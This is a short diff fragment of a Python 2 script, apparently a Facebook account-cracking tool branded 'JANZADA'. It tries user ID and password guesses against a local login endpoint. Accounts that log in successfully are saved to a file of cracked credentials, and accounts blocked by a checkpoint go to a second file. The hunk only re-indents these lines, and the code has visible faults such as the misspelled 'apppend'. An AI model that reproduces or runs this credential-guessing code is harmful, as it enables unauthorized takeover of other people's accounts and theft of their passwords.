@@ -823,17 +823,17 @@ def a_s():
                                                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass15, headers=header).text
                                                                     q = json.loads(data)
                                                                     if 'loc' in q:
-                                                                    print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass15 + '\x1b[0;97m'
-                                                                    ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
-                                                                    ok.write(uid + ' | ' + pass15 + '\n')
-                                                                    ok.close()
-                                                                    oks.append(uid + pass15)
-                                                                elif 'www.facebook.com' in q['error']:
-                                                                    print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass15
-                                                                    cp = open('JANZADA_CP.txt', 'a')
-                                                                    cp.write(uid + ' | ' + pass15 + '\n')
-                                                                    cp.close()
-                                                                    cps.apppend(uid + pass15)
+                                                                        print '\x1b[1;92m[JANZADA-OK] \x1b[1;32m' + uid + ' | ' + pass15 + '\x1b[0;97m'
+                                                                        ok = open('/sdcard/ids/JANZADA_OK.txt', 'a')
+                                                                        ok.write(uid + ' | ' + pass15 + '\n')
+                                                                        ok.close()
+                                                                        oks.append(uid + pass15)
+                                                                    elif 'www.facebook.com' in q['error']:
+                                                                        print '\x1b[1;31;1m[JANZADA-CP] ' + uid + ' | ' + pass15
+                                                                        cp = open('JANZADA_CP.txt', 'a')
+                                                                        cp.write(uid + ' | ' + pass15 + '\n')
+                                                                        cp.close()
+                                                                        cps.apppend(uid + pass15)
         except:
             pass
 
